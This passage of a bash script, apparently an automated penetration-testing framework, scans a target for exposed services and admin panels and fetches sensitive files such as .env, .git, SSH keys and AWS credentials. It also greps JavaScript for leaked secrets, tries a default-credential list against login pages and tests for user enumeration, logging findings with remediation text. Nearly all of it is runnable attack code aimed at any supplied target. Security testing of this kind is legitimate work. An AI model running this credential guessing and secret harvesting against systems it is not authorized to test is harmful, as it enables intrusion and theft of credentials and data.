  ["8500"]="Consul:CRITICAL:9.1:HashiCorp Consul UI exposed - cluster control"
  ["9000"]="PHP-FPM:CRITICAL:9.8:PHP-FPM exposed - remote code execution"
  ["9042"]="Cassandra:CRITICAL:9.8:Apache Cassandra DB exposed"
  ["9200"]="Elasticsearch:CRITICAL:9.9:Elasticsearch exposed - ALL data readable/writable"
  ["9300"]="Elasticsearch-Cluster:HIGH:7.5:Elasticsearch cluster API exposed"
  ["11211"]="Memcached:CRITICAL:9.8:Memcached exposed - data theft + UDP amplification DDoS"
  ["15672"]="RabbitMQ-Mgmt:HIGH:8.1:RabbitMQ management UI - default admin/admin"
  ["27017"]="MongoDB:CRITICAL:9.9:MongoDB exposed - often NO authentication required"
  ["27018"]="MongoDB-Shard:CRITICAL:9.9:MongoDB shard exposed"
  ["50000"]="SAP:CRITICAL:9.8:SAP ICM/J2EE exposed - known critical CVEs"
  ["50070"]="Hadoop:CRITICAL:9.8:Hadoop HDFS NameNode exposed - full data access"
  ["61616"]="ActiveMQ:CRITICAL:9.8:Apache ActiveMQ - recent critical RCE CVE-2023-46604"
)

for port in "${!DANGEROUS[@]}"; do
  IFS=':' read -r svc sev cvss desc <<< "${DANGEROUS[$port]}"
  if grep -q "$port/tcp.*open" "$P02/nmap_top1000.txt" "$P02/nmap_services.txt" 2>/dev/null; then
    if [[ "$sev" == "INFO" ]]; then
      info "Exposed: $svc on port $port"
    else
      vuln "EXPOSED SERVICE: $svc on port $port [$sev] — $desc"
      add_finding "Exposed $svc Service (Port $port)" "$sev" "$cvss" "nmap" \
        "$TARGET:$port" "network" \
        "$desc — port $port open from internet" \
        "# Check service:\nnmap -sV -sC -p $port $TARGET\nnc -v $TARGET $port\n\n# Redis check:\nredis-cli -h $TARGET -p 6379 INFO\n\n# MongoDB check:\nmongo --host $TARGET --port $port --eval 'db.adminCommand({listDatabases:1})'" \
        "Firewall port $port. Require auth. Move behind VPN. Patch to latest version." "network"
      notify_webhook "EXPOSED $svc:$port on $TARGET [$sev]"
    fi
  fi
done

# 2.6 CDN Detection + Origin IP Discovery
log "CDN detection and origin IP hunting..."
CDN_DETECTED=""
HEADERS=$(_curl_head "$BASE_URL")
for CDN_NAME in "cloudflare" "akamai" "fastly" "cloudfront" "sucuri" "incapsula" \
                "imperva" "edgecast" "stackpath" "bunnycdn" "keycdn"; do
  if echo "$HEADERS" | grep -qi "$CDN_NAME"; then
    CDN_DETECTED="$CDN_NAME"
    warn "CDN detected: $CDN_NAME — attempting origin IP discovery"
    break
  fi
done

if [[ -n "$CDN_DETECTED" ]]; then
  # Method 1: Check direct IP from Shodan/Censys history
  # Method 2: Check non-CDN subdomains (ftp, mail, ssh, vpn, origin, direct)
  for SUB in ftp mail smtp pop imap origin direct api staging dev test old \
             cpanel webmail autodiscover admin backend internal; do
    DIRECT_IP=$(dig +short "$SUB.$TARGET" 2>/dev/null | grep -E '^[0-9]+\.' | head -1 || true)
    if [[ -n "$DIRECT_IP" && "$DIRECT_IP" != "$TARGET_IP" ]]; then
      ok "Potential origin IP via $SUB.$TARGET: $DIRECT_IP"
      echo "$SUB.$TARGET:$DIRECT_IP" >> "$P02/origin_ips.txt"
    fi
  done
  # Method 3: Security.txt / TXT records
  TXTREC=$(dig TXT "_dmarc.$TARGET" +short 2>/dev/null || true)
  echo "DMARC: $TXTREC" >> "$P02/dns_misc.txt"
fi

# 2.7 Cloud Infrastructure Detection
log "Cloud provider detection..."
CLOUD=""
if echo "${HEADERS}${AXFR:-}" | grep -qi "amazonaws\|cloudfront\|s3.aws"; then CLOUD="AWS"; fi
if echo "${HEADERS:-}" | grep -qi "azurewebsites\|azure\|blob.core"; then CLOUD="Azure"; fi
if echo "${HEADERS:-}" | grep -qi "googleapis\|appspot\|gcloud"; then CLOUD="GCP"; fi
if [[ -n "$CLOUD" ]]; then
  ok "Cloud provider detected: $CLOUD"
  echo "$CLOUD" > "$P02/cloud_provider.txt"
fi

ok "Phase 02 complete"

# ══════════════════════════════════════════════════════════════════════
# PHASE 03 — WEB FINGERPRINTING
# ══════════════════════════════════════════════════════════════════════
phase_banner "03" "WEB FINGERPRINTING" \
  "HTTPX · WAF · Tech Stack · Cookie Analysis · Header Analysis · CMS Detection"

# 3.1 Live host probing all subdomains
log "Probing all subdomains..."
if has httpx; then
  httpx -l "$P01/all_subs.txt" \
    -title -tech-detect -status-code \
    -content-length -follow-redirects \
    -ip -cdn -probe \
    -timeout 10 -threads "$THREADS" \
    -silent \
    -json -o "$P03/httpx_full.json" 2>/dev/null || true

  # Extract live URLs
  python3 -c "
import json
urls=set()
try:
  with open('$P03/httpx_full.json') as f:
    for line in f:
      try:
        d=json.loads(line)
        u=d.get('url','')
        if u: urls.add(u)
      except: pass
  with open('$P03/live_urls.txt','w') as f:
    f.write('\n'.join(sorted(urls)))
  print(f'Live URLs: {len(urls)}')
except: pass
" 2>/dev/null || true
fi

# Also probe base URL
echo "$BASE_URL" >> "$P03/live_urls.txt" 2>/dev/null || true
sort -u "$P03/live_urls.txt" -o "$P03/live_urls.txt" 2>/dev/null || touch "$P03/live_urls.txt"
echo "$BASE_URL" >> "$P03/live_urls.txt"
sort -u "$P03/live_urls.txt" -o "$P03/live_urls.txt"

LIVE_COUNT=$(wc -l < "$P03/live_urls.txt" 2>/dev/null || echo 0)
ok "Live web targets: $LIVE_COUNT"

# 3.2 WAF Detection
log "WAF detection on all live hosts..."
if has wafw00f; then
  wafw00f "$BASE_URL" -o "$P03/waf_result.txt" 2>/dev/null || true
fi

# 3.3 Technology Fingerprinting
log "Deep technology fingerprinting..."
if has whatweb; then
  whatweb -a 3 -t "$THREADS" \
    --log-verbose="$P03/whatweb_verbose.txt" \
    --log-json="$P03/whatweb.json" \
    "$BASE_URL" 2>/dev/null || true
fi

# 3.4 Response Header Deep Analysis
log "Deep HTTP header analysis..."
RESP_HEADERS=$(_curl_head "$BASE_URL" 2>/dev/null || true)
echo "$RESP_HEADERS" > "$P03/headers.txt"

# Server version disclosure
SERVER=$(echo "$RESP_HEADERS" | grep -i "^server:" | head -1)
XPOW=$(echo "$RESP_HEADERS" | grep -i "^x-powered-by:" | head -1)
if [[ -n "$SERVER" ]]; then
  if echo "$SERVER" | grep -qiE "[0-9]+\.[0-9]+"; then
    vuln "SERVER VERSION DISCLOSED: $SERVER"
    add_finding "Server Version Disclosure" "LOW" "4.0" "curl" \
      "$BASE_URL" "Server header" "$SERVER" \
      "curl -sk -I $BASE_URL | grep -i server" \
      "Set generic Server header. Remove version info from all headers." "disclosure"
  fi
fi
if [[ -n "$XPOW" ]]; then
  vuln "TECHNOLOGY DISCLOSED: $XPOW"
  add_finding "Technology Disclosure via X-Powered-By" "LOW" "3.7" "curl" \
    "$BASE_URL" "X-Powered-By header" "$XPOW" \
    "curl -I $BASE_URL | grep -i powered" \
    "Remove X-Powered-By header from server configuration." "disclosure"
fi

# 3.5 Cookie Security Analysis
log "Cookie security analysis..."
COOKIES=$(_curl_body -c "$TMPD/cookies.txt" -b "" "$BASE_URL" 2>/dev/null | head -1 || true)
if [[ -f "$TMPD/cookies.txt" ]]; then
  while IFS=$'\t' read -r _ _ _ _ _ name value; do
    [[ -z "$name" || "$name" == "#"* ]] && continue
    COOKIE_ISSUES=""
    # Check Secure flag
    grep -q "$name" "$TMPD/cookies.txt" && ! grep -qP "$name.*[Ss]ecure" "$P03/headers.txt" && \
      COOKIE_ISSUES="Missing Secure flag"
    # Check HttpOnly
    ! grep -qPi "httponly" "$P03/headers.txt" && \
      COOKIE_ISSUES="$COOKIE_ISSUES; Missing HttpOnly flag"
    # Check SameSite
    ! grep -qPi "samesite" "$P03/headers.txt" && \
      COOKIE_ISSUES="$COOKIE_ISSUES; Missing SameSite attribute"
    if [[ -n "$COOKIE_ISSUES" ]]; then
      vuln "INSECURE COOKIE: $name — $COOKIE_ISSUES"
      add_finding "Insecure Cookie Configuration: $name" "MEDIUM" "5.3" "curl" \
        "$BASE_URL" "Set-Cookie: $name" \
        "Cookie $name missing: $COOKIE_ISSUES" \
        "curl -I $BASE_URL | grep -i set-cookie" \
        "Add Secure, HttpOnly, SameSite=Strict attributes to all session cookies." "web"
    fi
  done < "$TMPD/cookies.txt" 2>/dev/null || true
fi

# 3.6 CMS Specific Detection
CMS_DETECTED=""
if grep -qi "wordpress\|wp-content\|wp-json" "$P03/whatweb_verbose.txt" 2>/dev/null || \
   _curl_body "$BASE_URL/wp-login.php" 2>/dev/null | grep -qi "wordpress"; then
  CMS_DETECTED="WordPress"
  ok "CMS: WordPress — initiating WPScan..."
  if has wpscan; then
    wpscan --url "$BASE_URL" \
      --enumerate vp,vt,u,ap,at,cb,dbe,tt \
      --no-update --format json \
      --output "$P03/wpscan.json" 2>/dev/null || true
    # Parse WPScan for vulns
    python3 - << PYEOF 2>/dev/null
import json
try:
  with open('$P03/wpscan.json') as f: d=json.load(f)
  vulns=d.get('vulnerabilities',{})
  version=d.get('version',{})
  users=d.get('users',{})
  print(f"WordPress {version.get('number','?')} | Vulns: {len(vulns)} | Users: {list(users.keys())[:5]}")
except: pass
PYEOF
  fi
elif _curl_body "$BASE_URL/administrator/" 2>/dev/null | grep -qi "joomla"; then
  CMS_DETECTED="Joomla"
elif _curl_body "$BASE_URL/user/login" 2>/dev/null | grep -qi "drupal"; then
  CMS_DETECTED="Drupal"
fi
[[ -n "$CMS_DETECTED" ]] && ok "CMS Detected: $CMS_DETECTED" && echo "$CMS_DETECTED" > "$P03/cms.txt"

ok "Phase 03 complete"

# ══════════════════════════════════════════════════════════════════════
# PHASE 04 — DEEP CONTENT DISCOVERY
# ══════════════════════════════════════════════════════════════════════
phase_banner "04" "DEEP CONTENT DISCOVERY" \
  "Feroxbuster · FFUF · Gobuster · Katana · Crawling · Admin Panels · Sensitive Files"

# 4.1 robots.txt + sitemap harvesting
log "Parsing robots.txt, sitemaps, and security.txt..."
for SCHEME in https http; do
  for FILE in robots.txt sitemap.xml sitemap_index.xml sitemap.php \
              sitemap.txt .well-known/security.txt security.txt \
              .well-known/change-password humans.txt crossdomain.xml; do
    CODE=$(_curl_code "$SCHEME://$TARGET/$FILE")
    if [[ "$CODE" == "200" ]]; then
      ok "Found: $SCHEME://$TARGET/$FILE"
      _curl_body "$SCHEME://$TARGET/$FILE" > "$P04/${FILE//\//_}" 2>/dev/null || true
      # Extract disallowed paths
      if [[ "$FILE" == "robots.txt" ]]; then
        grep -i "Disallow:" "$P04/${FILE//\//_}" 2>/dev/null \
          | awk '{print $2}' >> "$P04/robots_paths.txt" || true
      fi
    fi
  done
done

# Aggregate all URLs to crawl
cat "$P01/all_urls.txt" "$P04/robots_paths.txt" 2>/dev/null | \
  awk -v base="$BASE_URL" '{if($0~/^\//) print base$0; else print $0}' | \
  sort -u > "$P04/seeds.txt"

# 4.2 Katana deep crawl
if has katana; then
  log "Deep crawl with Katana..."
  katana -u "$BASE_URL" \
    -d 5 -jc -kf all \
    -c "$THREADS" \
    -silent -o "$P04/katana_urls.txt" 2>/dev/null || true
  cat "$P04/katana_urls.txt" >> "$P04/seeds.txt" 2>/dev/null || true
  sort -u "$P04/seeds.txt" -o "$P04/seeds.txt"
fi

# 4.3 Admin Panel Discovery — all subdomains
log "Admin panel hunting on all live targets..."
while IFS= read -r LURL; do
  [[ -z "$LURL" ]] && continue
  gobuster dir -u "$LURL" \
    -w "$WL_ADMIN" \
    -q --no-error --timeout 10s \
    -o "$P04/admin_$(echo $LURL | md5sum | cut -c1-8).txt" \
    2>/dev/null &
  # Limit parallel jobs
  [[ $(jobs -r | wc -l) -ge 5 ]] && wait
done < "$P03/live_urls.txt"
wait

# Collect admin findings
cat "$P04"/admin_*.txt 2>/dev/null | grep -E "Status: (200|301|302|403)" > "$P04/admin_found.txt" || true
while IFS= read -r line; do
  [[ -z "$line" ]] && continue
  AURL=$(echo "$line" | grep -oP 'https?://[^\s]+' | head -1)
  CODE=$(echo "$line" | grep -oP 'Status: \K\d+')
  if [[ -n "$AURL" ]]; then
    vuln "ADMIN PANEL: $AURL (HTTP $CODE)"
    add_finding "Exposed Admin Panel" "HIGH" "7.2" "gobuster" \
      "$AURL" "path" "Admin panel accessible: HTTP $CODE" \
      "curl -sv '$AURL'\n# Try default creds:\ncurl -d 'user=admin&pass=admin' '$AURL'" \
      "Restrict admin paths by IP. Enforce MFA. Move to non-standard location." "access"
  fi
done < "$P04/admin_found.txt"

# 4.4 Directory Brute Force with FFUF
log "Directory and file brute force with ffuf..."
ffuf -u "$BASE_URL/FUZZ" \
  -w "$WL_DIRS" \
  -mc 200,201,204,301,302,401,403 \
  -fc 404 -t "$THREADS" -s \
  -o "$P04/ffuf_dirs.json" -of json \
  2>/dev/null || true

# 4.5 Feroxbuster recursive discovery
if has feroxbuster; then
  log "Recursive content discovery with feroxbuster..."
  feroxbuster --url "$BASE_URL" \
    --wordlist "$WL_DIRS" \
    --depth 4 --threads "$THREADS" \
    --timeout 10 --silent \
    --status-codes 200,201,204,301,302,401,403 \
    --output "$P04/ferox_results.txt" \
    --no-state 2>/dev/null || true
fi

# 4.6 Comprehensive sensitive file check (50+ paths)
log "Checking 70+ sensitive paths..."
SENSITIVE_PATHS=(
  # Environment & Config
  "/.env" "/.env.local" "/.env.dev" "/.env.development"
  "/.env.prod" "/.env.production" "/.env.staging" "/.env.backup"
  "/.env.bak" "/.env.old" "/.env.example" "/.env.sample"
  "/config.env" "/app.env" "/.envrc"
  # Git & VCS
  "/.git/HEAD" "/.git/config" "/.git/COMMIT_EDITMSG"
  "/.git/description" "/.git/index" "/.git/packed-refs"
  "/.git/refs/heads/main" "/.git/refs/heads/master"
  "/.gitignore" "/.gitconfig" "/.gitmodules"
  "/.svn/entries" "/.svn/wc.db"
  "/.hg/hgrc" "/.bzr/README"
  # Config Files
  "/config.php" "/config.inc.php" "/configuration.php"
  "/config.yml" "/config.yaml" "/config.json" "/config.xml"
  "/settings.py" "/settings.php" "/settings.yml"
  "/database.php" "/db.php" "/db_config.php"
  "/application.properties" "/application.yml" "/bootstrap.yml"
  "/web.config" "/web.config.bak"
  "/wp-config.php" "/wp-config.php.bak" "/wp-config.txt"
  "/wp-config-sample.php"
  "/configuration.php" "/config/config.php"
  # Debug & Info
  "/phpinfo.php" "/info.php" "/php.php" "/test.php" "/debug.php"
  "/server-status" "/server-info"
  "/_profiler" "/_profiler/phpinfo" "/_profiler/open"
  "/actuator" "/actuator/env" "/actuator/heapdump"
  "/actuator/mappings" "/actuator/beans" "/actuator/trace"
  "/actuator/httptrace" "/actuator/logfile" "/actuator/shutdown"
  "/health" "/metrics" "/env" "/dump" "/trace"
  # Admin / Consoles
  "/console" "/jconsole" "/jmx-console" "/admin-console"
  "/h2-console" "/druid/index.html" "/druid/login.html"
  "/telescope" "/telescope/requests" "/horizon"
  "/nova" "/nova/login" "/adminpanel" "/admin.php"
  # Backup & Dumps
  "/backup.sql" "/dump.sql" "/db.sql" "/database.sql"
  "/backup.zip" "/backup.tar.gz" "/backup.tar" "/site.zip"
  "/www.zip" "/web.zip" "/app.zip" "/${TARGET}.zip"
  "/backup/" "/backups/" "/bak/" "/old/"
  # API Docs
  "/swagger.json" "/swagger.yaml" "/swagger-ui.html"
  "/openapi.json" "/openapi.yaml" "/api-docs" "/api/docs"
  "/v1/api-docs" "/v2/api-docs" "/v3/api-docs"
  "/redoc" "/graphql" "/graphiql" "/__graphql"
  "/playground" "/graphql/console"
  # Source & Package
  "/composer.json" "/composer.lock" "/package.json" "/package-lock.json"
  "/yarn.lock" "/Gemfile" "/Gemfile.lock" "/requirements.txt"
  "/Pipfile" "/Pipfile.lock" "/go.mod" "/go.sum"
  "/Makefile" "/Dockerfile" "/.dockerignore" "/docker-compose.yml"
  "/docker-compose.yaml" "/kubernetes.yml" "/.travis.yml"
  "/.github/workflows/ci.yml" "/.gitlab-ci.yml" "/Jenkinsfile"
  # Credentials & Keys
  "/.htpasswd" "/.htaccess" "/.bash_history"
  "/.ssh/id_rsa" "/.ssh/id_dsa" "/.ssh/id_ecdsa"
  "/.ssh/authorized_keys" "/.ssh/known_hosts"
  "/id_rsa" "/server.key" "/private.key" "/cert.key"
  # Logs
  "/access.log" "/error.log" "/debug.log" "/app.log"
  "/logs/access.log" "/logs/error.log" "/var/log/apache2/access.log"
  # Misc
  "/crossdomain.xml" "/clientaccesspolicy.xml"
  "/trace" "/.trace" "/RELEASE-NOTES.txt" "/CHANGELOG.md"
  "/INSTALL.md" "/README.md" "/LICENSE" "/version.txt"
  "/build.gradle" "/pom.xml" "/.npmrc" "/.pypirc" "/.aws/credentials"
)

FOUND_SENSITIVE=0
for SPATH in "${SENSITIVE_PATHS[@]}"; do
  CODE=$(_curl_code "$BASE_URL$SPATH")
  if [[ "$CODE" == "200" ]]; then
    BODY=$(_curl_body "$BASE_URL$SPATH" 2>/dev/null | head -c 2000 || true)
    SIZE=$(echo "$BODY" | wc -c)
    [[ "$SIZE" -lt 20 ]] && continue
    FOUND_SENSITIVE=$((FOUND_SENSITIVE+1))
    SEV="MEDIUM"; CVSS="5.3"
    echo "$SPATH" | grep -qE '\.env|\.git|config|password|\.ssh|heapdump|credentials|\.aws' \
      && SEV="CRITICAL" && CVSS="9.1"
    echo "$SPATH" | grep -qE 'swagger|graphql|actuator|phpinfo|debug|console' \
      && SEV="HIGH" && CVSS="7.5"
    vuln "SENSITIVE FILE: $BASE_URL$SPATH [$SEV] (${SIZE}B)"
    PREVIEW=$(echo "$BODY" | strings 2>/dev/null | head -3 | tr '\n' ' ')
    add_finding "Sensitive File Exposed: $SPATH" "$SEV" "$CVSS" "curl" \
      "$BASE_URL$SPATH" "path" \
      "HTTP 200 — ${SIZE}B — Preview: ${PREVIEW:0:200}" \
      "curl -sk '$BASE_URL$SPATH'\ncurl -sk '$BASE_URL$SPATH' | grep -iE 'password|secret|key|token|db_'" \
      "Delete from web root. Add deny rules. Rotate any exposed credentials immediately." "exposure"
    notify_webhook "SENSITIVE FILE: $SPATH on $TARGET [$SEV]"
  fi
done
ok "Sensitive paths checked: ${#SENSITIVE_PATHS[@]} | Found: $FOUND_SENSITIVE"

# 4.7 Directory Listing Detection
log "Directory listing detection..."
for TESTDIR in /images /uploads /files /static /assets /media /css /js /data \
               /temp /tmp /logs /backup /admin /api /docs /download /downloads; do
  BODY=$(_curl_body "$BASE_URL$TESTDIR/" 2>/dev/null || true)
  if echo "$BODY" | grep -qi "Index of\|Parent Directory\|Directory listing"; then
    vuln "DIRECTORY LISTING: $BASE_URL$TESTDIR/"
    add_finding "Directory Listing Enabled" "MEDIUM" "5.3" "curl" \
      "$BASE_URL$TESTDIR/" "path" \
      "Server returns directory index — files browseable" \
      "curl -sk '$BASE_URL$TESTDIR/'\nbrowse to $BASE_URL$TESTDIR/ in browser" \
      "Disable directory listing: Options -Indexes in Apache / autoindex off in Nginx." "exposure"
  fi
done

ok "Phase 04 complete"

# ══════════════════════════════════════════════════════════════════════
# PHASE 05 — PARAMETER MINING
# ══════════════════════════════════════════════════════════════════════
phase_banner "05" "PARAMETER MINING" \
  "Arjun · ParamSpider · Historical Params · JS Analysis · Hidden Param Discovery"

# 5.1 Extract param URLs from all sources
log "Extracting parameter URLs from all sources..."
cat "$P01/all_urls.txt" "$P04/seeds.txt" "$P04/katana_urls.txt" 2>/dev/null | \
  grep "=" | \
  grep -v '\.(png|jpg|gif|css|woff|ico|svg|ttf|pdf|zip|mp4|mp3|avi)' | \
  sort -u > "$P05/all_param_urls.txt"
PARAM_COUNT=$(wc -l < "$P05/all_param_urls.txt" 2>/dev/null || echo 0)
ok "Parameter URLs: $PARAM_COUNT"

# 5.2 Arjun — hidden parameter discovery
if has arjun; then
  log "Hidden parameter discovery with Arjun..."
  arjun -u "$BASE_URL" \
    -oJ "$P05/arjun_params.json" \
    -q 2>/dev/null || true
fi

# 5.3 ParamSpider
if has paramspider; then
  log "ParamSpider parameter extraction..."
  paramspider -d "$TARGET" -l high -s 2>/dev/null | \
    grep "=" | sort -u >> "$P05/all_param_urls.txt" || true
fi

# 5.4 Custom param mining from JS files
log "Extracting parameters from JavaScript files..."
> "$P05/js_params.txt"
# Get JS URLs
_curl_body "$BASE_URL" 2>/dev/null | \
  grep -oP '(?:src|href)="([^"]+\.js[^"]*)"' | \
  grep -oP '"[^"]+"' | tr -d '"' | \
  while read -r JSREL; do
    [[ "$JSREL" == http* ]] && echo "$JSREL" || echo "$BASE_URL/$JSREL"
  done > "$P05/js_files.txt" 2>/dev/null || true

# Check nuclei-detected JS files too
cat "$P04/katana_urls.txt" 2>/dev/null | grep '\.js' | \
  grep -v '\.json\|\.jsx' >> "$P05/js_files.txt" || true
sort -u "$P05/js_files.txt" -o "$P05/js_files.txt"

# Mine params + secrets from each JS file
> "$P05/js_secrets.txt"
SECRET_PATTERNS=(
  'AKIA[0-9A-Z]{16}'
  'AIza[0-9A-Za-z\-_]{35}'
  'ya29\.[0-9A-Za-z\-_]+'
  '(api[_-]?key|apikey)\s*[=:]\s*["\x27][0-9A-Za-z\-_]{16,}'
  '(api[_-]?secret|apisecret)\s*[=:]\s*["\x27][0-9A-Za-z\-_]{16,}'
  '(access[_-]?token)\s*[=:]\s*["\x27][0-9A-Za-z\-_]{20,}'
  '(secret[_-]?key|secretkey)\s*[=:]\s*["\x27][0-9A-Za-z\-_]{16,}'
  '(client[_-]?secret)\s*[=:]\s*["\x27][0-9A-Za-z\-_]{16,}'
  '(auth[_-]?token)\s*[=:]\s*["\x27][0-9A-Za-z\-_]{20,}'
  '(password|passwd)\s*[=:]\s*["\x27][^\x27"]{6,}'
  '(bearer\s+)[A-Za-z0-9\-_.]+\.[A-Za-z0-9\-_.]+\.[A-Za-z0-9\-_.]+'
  'eyJ[A-Za-z0-9+/=_\-]{20,}\.[A-Za-z0-9+/=_\-]{20,}'
  '(slack[_-]?token)\s*[=:]\s*["\x27]xox[baprs]-[^\x27"]+'
  '(twilio[_-]?sid)\s*[=:]\s*["\x27]AC[0-9a-z]{32}'
  '(stripe[_-]?key)\s*[=:]\s*["\x27](sk|pk)_(test|live)_[0-9A-Za-z]+'
  '(sendgrid[_-]?key)\s*[=:]\s*["\x27]SG\.[0-9A-Za-z\-_]{22,}'
  '(firebase|firebaseio)\s*[=:]\s*["\x27][^\x27"]{30,}'
  '(db[_-]?pass|database[_-]?password)\s*[=:]\s*["\x27][^\x27"]{4,}'
  '(private[_-]?key)\s*[=:]\s*["\x27]-----BEGIN'
  'ghp_[A-Za-z0-9]{36}'
  'glpat-[A-Za-z0-9_\-]{20}'
)

while IFS= read -r JSURL; do
  [[ -z "$JSURL" ]] && continue
  JSCONTENT=$(_curl_body "$JSURL" 2>/dev/null | head -c 200000 || true)
  [[ -z "$JSCONTENT" ]] && continue
  for PAT in "${SECRET_PATTERNS[@]}"; do
    MATCHES=$(echo "$JSCONTENT" | grep -oiP "$PAT" 2>/dev/null | head -3 || true)
    if [[ -n "$MATCHES" ]]; then
      crit "HARDCODED SECRET in $JSURL"
      echo "=== $JSURL ===" >> "$P05/js_secrets.txt"
      echo "$MATCHES" >> "$P05/js_secrets.txt"
      add_finding "Hardcoded Secret in JavaScript" "CRITICAL" "9.1" "custom" \
        "$JSURL" "JavaScript source" \
        "Pattern match: ${MATCHES:0:150}" \
        "curl -sk '$JSURL' | grep -iP 'api_key|secret|token|password|AKIA|eyJ'\n\n# Full JS analysis:\ncurl -sk '$JSURL' > file.js && cat file.js | grep -oiP 'AKIA[0-9A-Z]{16}'" \
        "NEVER store secrets in client-side code. Rotate ALL exposed credentials. Use server-side env vars." "exposure"
      notify_webhook "HARDCODED SECRET in JS on $TARGET — CHECK NOW"
    fi
  done
  # Extract URLs/endpoints from JS
  echo "$JSCONTENT" | grep -oP '(?:"|'"'"')(/[a-zA-Z0-9_./?=&\-]+)(?:"|'"'"')' 2>/dev/null | \
    tr -d '"'"'" | grep -v '^\s*$' >> "$P05/js_endpoints.txt" || true
done < "$P05/js_files.txt"

sort -u "$P05/js_endpoints.txt" -o "$P05/js_endpoints.txt" 2>/dev/null || true
JS_ENDPOINTS=$(wc -l < "$P05/js_endpoints.txt" 2>/dev/null || echo 0)
ok "JS endpoints extracted: $JS_ENDPOINTS"

# 5.5 GF pattern matching on all URLs
if has gf; then
  log "GF pattern matching for high-value params..."
  for PATTERN in sqli lfi ssrf redirect xss ssti; do
    cat "$P05/all_param_urls.txt" 2>/dev/null | \
      gf "$PATTERN" 2>/dev/null > "$P05/gf_${PATTERN}.txt" || true
    COUNT=$(wc -l < "$P05/gf_${PATTERN}.txt" 2>/dev/null || echo 0)
    [[ "$COUNT" -gt 0 ]] && ok "GF $PATTERN: $COUNT URLs"
  done
fi

# Merge all param URLs
cat "$P05"/gf_*.txt "$P05/all_param_urls.txt" 2>/dev/null | \
  sort -u > "$P05/targets_all.txt"

ok "Phase 05 complete — Total param URLs: $(wc -l < "$P05/targets_all.txt" 2>/dev/null || echo 0)"

# ══════════════════════════════════════════════════════════════════════
# PHASE 06 — AUTHENTICATION ATTACKS
# ══════════════════════════════════════════════════════════════════════
phase_banner "06" "AUTHENTICATION ATTACKS" \
  "Default Creds · Brute Force · JWT Vulnerabilities · OAuth · SAML · MFA Bypass"

# 6.1 Login endpoint discovery
log "Discovering authentication endpoints..."
AUTH_ENDPOINTS=()
for PATH in /login /signin /sign-in /auth /authenticate /session/new \
            /account/login /users/sign_in /member/login \
            /admin/login /admin/signin /wp-login.php \
            /api/login /api/auth /api/v1/login /api/v1/auth \
            /oauth/token /oauth/authorize \
            /api/token /api/sessions; do
  CODE=$(_curl_code "$BASE_URL$PATH")
  if [[ "$CODE" =~ ^(200|301|302|401|403)$ ]]; then
    AUTH_ENDPOINTS+=("$BASE_URL$PATH")
    ok "Auth endpoint: $BASE_URL$PATH (HTTP $CODE)"
    echo "$BASE_URL$PATH" >> "$P06/auth_endpoints.txt"
  fi
done

# 6.2 Default credential testing
if [[ "$SKIP_HEAVY" == "false" ]]; then
  log "Default credential testing on login endpoints..."
  DEFAULT_CREDS=(
    "admin:admin" "admin:password" "admin:123456" "admin:admin123"
    "admin:letmein" "admin:changeme" "admin:password123" "admin:Admin123"
    "admin:admin@123" "admin:Pass@123" "admin:1234" "admin:qwerty"
    "root:root" "root:toor" "root:password" "root:123456"
    "administrator:administrator" "administrator:password" "administrator:admin"
    "test:test" "test:password" "guest:guest" "guest:password"
    "user:user" "user:password" "operator:operator" "manager:manager"
    "info:info" "master:master" "superuser:superuser"
    "admin:Welcome1" "admin:Summer2024!" "admin:Winter2024!"
    "admin:Spring2024!" "admin:Company123"
  )

  for AUTH_URL in "${AUTH_ENDPOINTS[@]}"; do
    for CRED in "${DEFAULT_CREDS[@]}"; do
      USER="${CRED%%:*}"; PASS="${CRED##*:}"
      # Try POST form submission
      RESP=$(_curl_body \
        -c "$TMPD/auth_${USER}_cookies.txt" \
        -d "username=$USER&password=$PASS&user=$USER&pass=$PASS&\
login=$USER&pwd=$PASS&email=$USER@$TARGET" \
        "$AUTH_URL" 2>/dev/null | head -c 5000 || true)
      LOCATION=$(_curl_head \
        -d "username=$USER&password=$PASS" \
        "$AUTH_URL" 2>/dev/null | grep -i "^location:" | awk '{print $2}' | tr -d '\r' || true)
      # Heuristic: redirect to dashboard, OR 200 with welcome/dashboard keywords
      if echo "$LOCATION" | grep -qiE "dashboard|admin|home|panel|account|welcome|profile|console"; then
        crit "DEFAULT CREDENTIALS: $USER:$PASS on $AUTH_URL"
        add_finding "Default/Weak Credentials" "CRITICAL" "9.8" "curl" \
          "$AUTH_URL" "username=$USER&password=$PASS" \
          "Login succeeded with $USER:$PASS — redirected to: $LOCATION" \
          "curl -sk -c cookies.txt -d 'username=$USER&password=$PASS' '$AUTH_URL' -L\ncurl -sk -b cookies.txt '$BASE_URL/admin/'" \
          "Change default credentials immediately. Enforce strong password policy. Implement account lockout." "auth"
        notify_webhook "DEFAULT CREDS FOUND: $USER:$PASS on $AUTH_URL"
        break 2
      fi
    done
  done
fi

# 6.3 User Enumeration
log "User enumeration testing..."
for AUTH_URL in "${AUTH_ENDPOINTS[@]}"; do
  # Test timing difference between valid/invalid users
  T1_START=$(date +%s%3N)
  _curl_body -d "username=admin&password=INVALID_PASS_HACKEROFHELL" \
    "$AUTH_URL" >/dev/null 2>&1 || true
  T1_END=$(date +%s%3N)
  T1=$((T1_END - T1_START))

  T2_START=$(date +%s%3N)
  _curl_body -d "username=nonexistent_user_hackerofhell&password=INVALID_PASS" \
    "$AUTH_URL" >/dev/null 2>&1 || true
  T2_END=$(date +%s%3N)
  T2=$((T2_END - T2_START))

  DIFF=$(( T1 > T2 ? T1 - T2 : T2 - T1 ))
  if [[ "$DIFF" -gt 500 ]]; then
    vuln "USER ENUMERATION via timing on $AUTH_URL (${DIFF}ms difference)"
    add_finding "User Enumeration via Timing" "MEDIUM" "5.3" "curl" \
      "$AUTH_URL" "username" \
      "Response time difference: ${DIFF}ms (valid vs invalid user)" \
      "for user in admin root test user; do time curl -d \"username=\$user&password=wrong\" '$AUTH_URL'; done" \
      "Use constant-time comparison. Return identical responses for valid/invalid users." "auth"
  fi

  # Message-based enumeration
  VALID_RESP=$(_curl_body -d "username=admin&password=INVALID123HACKEROFHELL" "$AUTH_URL" 2>/dev/null || true)
  INVAL_RESP=$(_curl_body -d "username=zzznobodyxxx&password=INVALID123HACKEROFHELL" "$AUTH_URL" 2>/dev/null || true)
  if [[ "$VALID_RESP" != "$INVAL_RESP" ]]; then
    VALID_LEN=${#VALID_RESP}; INVAL_LEN=${#INVAL_RESP}
    if [[ $((VALID_LEN > INVAL_LEN ? VALID_LEN - INVAL_LEN : INVAL_LEN - VALID_LEN)) -gt 10 ]]; then
      vuln "USER ENUMERATION via response on $AUTH_URL"
